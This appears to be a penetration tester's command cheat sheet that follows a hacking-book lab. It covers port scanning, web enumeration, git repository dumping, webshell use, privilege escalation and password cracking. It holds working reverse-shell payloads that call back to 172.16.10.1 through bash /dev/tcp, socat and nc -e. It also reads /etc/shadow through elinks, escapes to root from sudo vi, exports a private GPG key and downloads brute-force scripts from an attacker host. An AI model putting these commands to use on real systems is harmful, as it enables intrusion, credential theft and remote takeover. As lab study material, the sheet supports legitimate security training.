
# Rustscan

rustscan -g -a 172.16.10.0/24 -r 1-1024 | awk -F'->' '{print $1,$2}'
rustscan -a 172.16.10.0/24 -r 1-65535 -b 1000 --ulimit 5000
rustscan -a 172.16.10.0/24 -r 20-22 -b 1000 --ulimit 5000
rustscan -a 172.16.10.10 -r 1-65535 -b 1000 --ulimit 5000 -g
rustscan -a 46.219.66.140 -b 1000 --ulimit 5000 -g

# Nmap

nmap scanme.nmap.org --open
nmap 46.219.66.140 --open
nmap -sV --script=banner.nse 172.16.10.11
nmap -sV --script=banner.nse 172.16.10.11 | grep "|_banner\||_http-server"
nmap --script=ssh-auth-methods 172.16.10.13
nmap --script="ftp*" 172.16.10.11
nmap --script="ftp-anon.nse" 172.16.10.11
ls -al /usr/share/nmap/scripts | grep ftp


# whatweb

whatweb 172.16.10.11:8081 --log-json=/dev/stdout --quiet 2> /dev/null | jq '.[0].plugins.HTTPServer.string[0]'

# netcat

nc -v 172.16.10.11 -w 1 80 2> /dev/null
nc 172.16.10.11 -v 21

# Nikto

echo n | nikto -h 172.16.10.10 -p 8081
echo n | nikto -h 172.16.10.11 -p 80
echo n | nikto -h 172.16.10.12 -p 80

# dirsearch

dirsearch -u http://172.16.10.10:8081/
dirsearch -u http://172.16.10.11
dirsearch -u http://172.16.10.11/backup/acme-hyper-branding/
dirsearch -u http://172.16.10.11/backup/acme-impact-alliance/
dirsearch -u http://46.219.66.140

# gitjacker

gitjacker http://172.16.10.11/backup/acme-impact-alliance/ -o data/172.16.10.11/acme-impact-alliance
cd data/172.16.10.11/acme-impact-alliance
gitjacker http://172.16.10.11/backup/acme-hyper-branding/ -o data/172.16.10.11/acme-hyper-branding
cd data/172.16.10.11/acme-hyper-branding
ls -la data/172.16.10.11/acme-impact-alliance
git log --pretty=format:"%an %ae"
git log | grep Author | grep -oP '(?<=Author: ).*' | sort -u | tr -d '<>'

# Nuclei
curl http://172.16.10.11/backup/acme-hyper-branding/.git/HEAD
ls -la  ~/.local/nuclei-templates/http/osint/phishing
cat ~/.local/nuclei-templates/http/osint/phishing/zoom-phish.yaml

nuclei -u 172.16.10.11 -t ~/.local/nuclei-templates/custom/git-finder.yaml
nuclei -tags apache,git -u 172.16.10.11
nuclei -tags apache,git -u 172.16.10.11 -j | jq
nuclei -u "172.16.10.11:21" -tags "ftp" -silent -nc | tr -d '[]'

nuclei -u 172.16.10.10:8081 > "playground/nuclei-scan-results/172-16-10-10:8081.txt"
nuclei -u 172.16.10.11:80 > "playground/nuclei-scan-results/172-16-10-11.txt"
nuclei -u 172.16.10.12:80 > "playground/nuclei-scan-results/172-16-10-12.txt"
nuclei -u 46.219.66.140

ftp ftp://anonymous:@172.16.10.11
ftp ftp://ftp_admin:@46.219.66.140
bash ch05/nuclei-notifier.sh 172.16.10.10:8081 172.16.10.11:80 172.16.10.12:80
echo -e acme-hyper-branding-{0..100}.{txt,csv,pdf,jpg}"\n" | sed 's/ //g' > "files_wordlist.txt"; head files_wordlist.txt
wget <URL>

# Malicious Polyglot Files
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x43\x00...' > polyglot.jpg
cat app.py >> polyglot.jpg

# Webshell

curl -s "http://172.16.10.10:8081/webshell/$(urlencode "ls")"
curl -s "http://172.16.10.10:8081/webshell/$(urlencode "cd ..")"
curl -s "http://172.16.10.10:8081/webshell/$(urlencode "cd ..; ls")"
bash playground/exercises/run_webshell_opt.sh 172.16.10.10:8081

# Reverse Shells

Set up listener
nc -l -p 1337 -vv
nc -lvp 1234
pwncat-cs -l -p 1337
pwncat-cs -l -p 1337 --ssl (requires Ncat installed on victims machine)
socat - tcp-listen:34459,fork
socat file:$(tty),raw,echo=0 tcp-listen:1337

Craft Payload
|bash -c 'bash -i >& /dev/tcp/172.16.10.1/1337 0>&1'
python3 -c 'import pty; pty.spawn("/bin/bash")'
|socat exec:'bash -li',pty,stderr tcp:172.16.10.1:1337
nc 172.16.10.1 1234 -e /bin/bash & (setup reverse shell via nc by uploading its binaries to the victims machine)

bash ch07/port-hopper.sh
nohup ./donation-monitor.sh > /dev/null 2>&1 &
nohup ./donation-monitor.sh &> /dev/null & (nohup makes process ignore SIGHUP signal -- unstoppable process)

# SSH Brute Force
ssh user@172.16.10.13
ssh backup@172.16.10.13
sshpass -p "my_password" ssh -o "StrictHostKeyChecking=no" \
               -p 22 "username@172.16.10.13" exit &> /dev/null; echo "Command exit code: $?"

# Local Information Gathering

cat /etc/passwd
awk -F':' '{print $1, $6, $7}' /etc/passwd | sed 's/ /, /g'

cat /etc/group
ls -l /home/

grep -e "#DSHELL" /etc/adduser.conf
grep -e "#SHELL" /etc/default/useradd
awk -F':' '{if ($7 == "/bin/sh" || $7 == "/bin/bash") {print $1,$7}}' /etc/passwd
grep -e "/bin/sh" -e "/bin/bash" /etc/passwd

ls -1 /proc/ | grep -E "^[0-9]+$"
ls -1 /proc/1
cat /proc/1/cmdline

ps aux
ps x -o user -o pid -o cmd
hostname
cat /etc/os-release
uname -o
uname -a
uname -r

w
who
last
head /var/run/utmp
head /var/log/wtmp
utmpdump /var/run/utmp
utmpdump /var/log/wtmp
history
find / -name ".*_history" -type f
find / -name ".*_history" -type f 2> /dev/null

# Detecting Network Interfaces

ls -l /sys/class/net/
ls -l /sys/devices/virtual/net
cat /proc/net/route

010A10AC is a gateway IP address in hexadecimal format
echo $((16#01))
echo $((16#0A))
echo $((16#10))
echo $((16#AC))

cat /proc/net/fib_trie
awk '/32 host/ { print f } {f=$2}' /proc/net/fib_trie | sort | uniq
ifconfig
ifconfig -a
ip addr

cat /proc/net/tcp
awk '{print $2,$3}' /proc/net/tcp | tail -n +2
netstat -atnup
nc -v 172.16.10.10 8081

iptables -L --line-numbers -v

# Domain Resolvers
cat /etc/resolv.conf
cat /etc/hosts
head /etc/resolv.conf
curl -s http://p-web-02.acme-infinity-servers.com > can be run from within 172.16.10.12

# Software Installations

apt list --installed
dpkg -l

# Storage

ls -la /mnt/log_storage
lsblk
cat /proc/partitions
cat /proc/mounts
mount
mount | grep /dev
df -h -T
cat /etc/fstab

# Logs

find / -name "*.log" -o -name "*.txt" -o -name "*.out" -type f 2> /dev/null

# Kernel

rpm -qa | grep kernel
ls -l /boot | grep "vmlinuz-"

# Configuration Files

find /etc /usr \
    -name "*.conf" \
    -o -name "*.cf" \
    -o -name "*.ini" \
    -o -name "*.cfg" \
    -o -name "*.cfg" \
    -type f 2> /dev/null
find / -name "*config*" -type f 2> /dev/null
find / -name "*config*" -type f 2> /dev/null | grep sql

# Schedule Jobs

crontab -e   >>>> add new job
crontab -l   >>>> see list of jobs
head /etc/cron.allow
head /etc/cron.deny

touch "$HOME/atfiletemp" | at now + 2 minute
atq

# Hardware

lshw
lshw -C disk
dmidecode
hwinfo

sudo apt install -y virt-what
sudo virt-what

systemd-detect-virt

dmesg
dmesg | grep "Detected virt"

ls -l /sys/class/dmi/id
cat /sys/class/dmi/id/product_name
cat /sys/class/dmi/id/sys_vendor
cat /sys/class/dmi/id/board_vendor
cat /sys/class/dmi/id/bios_vendor
cat /sys/class/dmi/id/product_version

cat /sys/hypervisor/type
sudo cat /proc/1/environ
cat /run/systemd/container

./home/kali/tools/LinEnum.sh -t -r "/tmp/linenum_report.txt"
linenum -t -r "/tmp/linenum_report.txt"
linenum -t -k "root"

# Privilege Escalation

ls -l /etc/passwd
touch my_new_file.sh
chown kali:kali my_new_file.sh
chmod u+rwx,g+r,o+r my_new_file.sh

# File Access Control List
sudo groupadd sysadmins
sudo useradd eve -G sysadmins
sudo useradd alice -G sysadmins
sudo useradd bob -G sysadmins

touch facl_example.txt
getfacl facl_example.txt
setfacl -m g:sysadmins:r-- facl_example.txt
setfacl -m u:eve:--- facl_example.txt

# SetUID and SetGID
ls -l /usr/bin/at
ls -l /usr/bin/passwd
ls -ld /tmp

mkdir /tmp/test
chmod +t /tmp/test
ls -ld /tmp/test

find / -perm -o=r
find / -perm -o=w
find / -perm -o=rwx 2> /dev/null

find / -perm -4000 2> /dev/null  SetUID
find / -perm -2000 2> /dev/null  SetGUID
find / -perm -1000 2> /dev/null  Stricky Bit

stat /usr/bin/elinks
ls -ld /usr/bin/elinks
elinks https://google.com -dump 1
elinks file:///etc/shadow -dump 1

find . -type f -exec grep -i password {} \;

nuclei -tags token,file,github -u 172.16.10.13  Current machine/local search

# Public/Private Keys

gpg --list-keys
touch private_pgp_key.pgp
gpg --output "private_pgp_key.pgp" --armor --export-secret-key arodriguez@acme-infinity-servers.com

# Crack Password from /etc/shadow
john ch09/password-cracking/hashes.txt --format=crypt --wordlist=ch09/password-cracking/wordlist.txt
john ch09/password-cracking/hashes.txt --format=crypt
john --show ch09/password-cracking/hashes.txt

# sudo configuration

sudo -l
ls -ld /etc/sudoers
cat /etc/sudoers
ls -ld /etc/sudoers.d
cat /etc/sudoers.d/kali-grant-root

# check my groups membership
groups

sudo vi /etc/demo.txt
cat /etc/passwd
sudo vi /etc/passwd

sudo vi   Press SHIFT-: (together) > enter !bash > logged in as root user

passwd
su - backup
su - root

# Kernal Exploits

uname -r -v
searchsploit linux kernel | grep -i "dirty cow"

grep "/bin/bash" /etc/passwd | grep -v "backup"
sudo curl http://172.16.10.1:8080/local_account_bf.sh -o $(pwd)/local_account_bf.sh
sudo curl http://172.16.10.1:8080/passwords.txt -o $(pwd)/passwords.txt

unix-privesc-check standard
unix-privesc-check detailed


